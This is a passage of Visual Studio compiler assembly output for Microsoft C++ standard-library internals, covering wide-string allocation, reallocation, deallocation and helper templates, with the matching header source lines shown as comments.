  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 ff c0	 inc	 rax
  00031	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00038	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  0003b	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Capacity$[rbp]
  00042	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00049	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
  0004e	48 89 45 08	 mov	 QWORD PTR _Fancy_ptr$[rbp], rax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00052	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00059	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0005c	48 ff c8	 dec	 rax
  0005f	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00066	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2634 :         return _Fancy_ptr;

  00069	48 8b 45 08	 mov	 rax, QWORD PTR _Fancy_ptr$[rbp]

; 2635 :     }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
_TEXT	SEGMENT
_Ptr$ = 224
_Bytes$ = 232
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z PROC		; std::_Deallocate<16,0>, COMDAT

; 255  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

$LN4:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 257  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 258  :     if (_STD is_constant_evaluated()) {
; 259  :         ::operator delete(_Ptr);
; 260  :     } else
; 261  : #endif // _HAS_CXX20
; 262  :     {
; 263  : #if defined(_M_IX86) || defined(_M_X64)
; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00024	48 81 bd e8 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002f	72 13		 jb	 SHORT $LN2@Deallocate

; 265  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);

  00031	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR _Bytes$[rbp]
  00038	48 8d 8d e0 00
	00 00		 lea	 rcx, QWORD PTR _Ptr$[rbp]
  0003f	e8 00 00 00 00	 call	 ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
$LN2@Deallocate:

; 266  :         }
; 267  : #endif // defined(_M_IX86) || defined(_M_X64)
; 268  :         ::operator delete(_Ptr, _Bytes);

  00044	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Bytes$[rbp]
  0004b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00052	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete

; 269  :     }
; 270  : }

  00057	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005e	5f		 pop	 rdi
  0005f	5d		 pop	 rbp
  00060	c3		 ret	 0
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ENDP		; std::_Deallocate<16,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 75   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@max
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@max
$LN3@max:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@max:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 78   : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
_TEXT	SEGMENT
_Old_capacity$ = 8
_New_capacity$ = 40
_Al$ = 72
_New_ptr$ = 104
__$ArrayPad$ = 312
this$ = 352
_New_size$ = 360
_Fn$ = 368
<_Args_0>$ = 376
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>, COMDAT

; 4778 :     _CONSTEXPR20 basic_string& _Reallocate_for(const size_type _New_size, _Fty _Fn, _ArgTys... _Args) {

$LN6:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 88 44 24 18	 mov	 BYTE PTR [rsp+24], r8b
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00027	b9 22 00 00 00	 mov	 ecx, 34			; 00000022H
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 88
	01 00 00	 mov	 rcx, QWORD PTR [rsp+392]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 38 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4779 :         // reallocate to store exactly _New_size elements, new buffer prepared by
; 4780 :         // _Fn(_New_ptr, _New_size, _Args...)
; 4781 :         if (_New_size > max_size()) {

  00058	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0005f	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00064	48 39 85 68 01
	00 00		 cmp	 QWORD PTR _New_size$[rbp], rax
  0006b	76 05		 jbe	 SHORT $LN2@Reallocate

; 4782 :             _Xlen_string(); // result too long

  0006d	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4783 :         }
; 4784 : 
; 4785 :         const size_type _Old_capacity = _Mypair._Myval2._Myres;

  00072	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00079	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  0007d	48 89 45 08	 mov	 QWORD PTR _Old_capacity$[rbp], rax

; 4786 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  00081	48 8b 95 68 01
	00 00		 mov	 rdx, QWORD PTR _New_size$[rbp]
  00088	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0008f	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00094	48 89 45 28	 mov	 QWORD PTR _New_capacity$[rbp], rax

; 4787 :         auto& _Al                     = _Getal();

  00098	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  000a4	48 89 45 48	 mov	 QWORD PTR _Al$[rbp], rax

; 4788 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000a8	48 8d 55 28	 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  000ac	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  000b0	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  000b5	48 89 45 68	 mov	 QWORD PTR _New_ptr$[rbp], rax

; 4789 : 
; 4790 :         _Mypair._Myval2._Orphan_all();

  000b9	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000c0	48 8b c8	 mov	 rcx, rax
  000c3	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4791 :         _ASAN_STRING_REMOVE(*this);
; 4792 :         _Mypair._Myval2._Mysize = _New_size;

  000c8	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000cf	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _New_size$[rbp]
  000d6	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 4793 :         _Mypair._Myval2._Myres  = _New_capacity;

  000da	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000e1	48 8b 4d 28	 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  000e5	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 4794 :         _Fn(_Unfancy(_New_ptr), _New_size, _Args...);

  000e9	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  000ed	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  000f2	4c 8b 8d 78 01
	00 00		 mov	 r9, QWORD PTR <_Args_0>$[rbp]
  000f9	4c 8b 85 68 01
	00 00		 mov	 r8, QWORD PTR _New_size$[rbp]
  00100	48 8b d0	 mov	 rdx, rax
  00103	48 8d 8d 70 01
	00 00		 lea	 rcx, QWORD PTR _Fn$[rbp]
  0010a	e8 00 00 00 00	 call	 ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()

; 4795 :         if (_Old_capacity > _Small_string_capacity) {

  0010f	48 83 7d 08 07	 cmp	 QWORD PTR _Old_capacity$[rbp], 7
  00114	76 27		 jbe	 SHORT $LN3@Reallocate

; 4796 :             _Deallocate_for_capacity(_Al, _Mypair._Myval2._Bx._Ptr, _Old_capacity);

  00116	4c 8b 45 08	 mov	 r8, QWORD PTR _Old_capacity$[rbp]
  0011a	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00121	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00124	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  00128	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4797 :             _Mypair._Myval2._Bx._Ptr = _New_ptr;

  0012d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00134	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00138	48 89 08	 mov	 QWORD PTR [rax], rcx

; 4798 :         } else {

  0013b	eb 13		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4799 :             _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);

  0013d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00144	48 8d 55 68	 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00148	48 8b c8	 mov	 rcx, rax
  0014b	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
$LN4@Reallocate:

; 4800 :         }
; 4801 : 
; 4802 :         _ASAN_STRING_CREATE(*this);
; 4803 :         return *this;

  00150	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN5@Reallocate:

; 4804 :     }

  00157	48 8b f8	 mov	 rdi, rax
  0015a	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0015e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData
  00165	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0016a	48 8b c7	 mov	 rax, rdi
  0016d	48 8b 8d 38 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00174	48 33 cd	 xor	 rcx, rbp
  00177	e8 00 00 00 00	 call	 __security_check_cookie
  0017c	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  00183	5f		 pop	 rdi
  00184	5d		 pop	 rbp
  00185	c3		 ret	 0
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_New_ptr$ = 264
_Count$ = 272
_Ptr$ = 280
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator(), COMDAT

; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);

  0002e	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00035	48 8b 95 18 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  0003c	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00043	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  00048	33 c0		 xor	 eax, eax
  0004a	66 89 85 c4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00051	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _New_ptr$[rbp]
  00058	48 8b 8d 10 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005f	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00063	48 8d 95 c4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0006a	48 8b c8	 mov	 rcx, rax
  0006d	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3427 :             },

  00072	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00079	5f		 pop	 rdi
  0007a	5d		 pop	 rbp
  0007b	c3		 ret	 0
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 224
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   :     return _Ptr;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]

; 37   : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Convert_size@_K_K@std@@YA_K_K@Z
_TEXT	SEGMENT
_Len$ = 224
??$_Convert_size@_K_K@std@@YA_K_K@Z PROC		; std::_Convert_size<unsigned __int64,unsigned __int64>, COMDAT

; 1112 :     sizeof(_Unsigned_type) <= sizeof(_Size_type)) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1113 :     // convert _Unsigned_type to _Size_type, avoiding truncation
; 1114 :     _STL_INTERNAL_STATIC_ASSERT(_Unsigned_type(-1) > 0);
; 1115 :     _STL_INTERNAL_STATIC_ASSERT(_Size_type(-1) > 0);
; 1116 : 
; 1117 :     if constexpr (sizeof(_Unsigned_type) > sizeof(_Size_type)) {
; 1118 :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 1119 :             _Xlength_error("size is too long for _Size_type");
; 1120 :         }
; 1121 :     }
; 1122 : 
; 1123 :     return static_cast<_Size_type>(_Len);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Len$[rbp]

; 1124 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Convert_size@_K_K@std@@YA_K_K@Z ENDP		; std::_Convert_size<unsigned __int64,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00023	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002a	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QEAA@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0002f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00036	48 8b c8	 mov	 rcx, rax
  00039	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0003e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00045	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
